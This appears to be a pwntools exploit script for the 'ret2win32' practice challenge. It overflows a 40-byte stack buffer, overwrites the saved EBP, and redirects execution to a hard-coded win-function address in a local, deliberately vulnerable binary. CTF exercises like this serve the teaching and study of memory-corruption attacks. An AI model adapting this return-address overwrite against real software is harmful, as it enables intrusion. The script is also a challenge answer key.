from pwn import *

ret2win32 = process('ret2win32')
ret2win32.recv()

payload = b"A" * 40        # pwnme allocates 40B of input buffer
payload += b"EBP4"         # 4B EBP
payload += p32(0x08048659) # EIP ret2win

ret2win32.sendline(payload)
ret2win32.interactive()
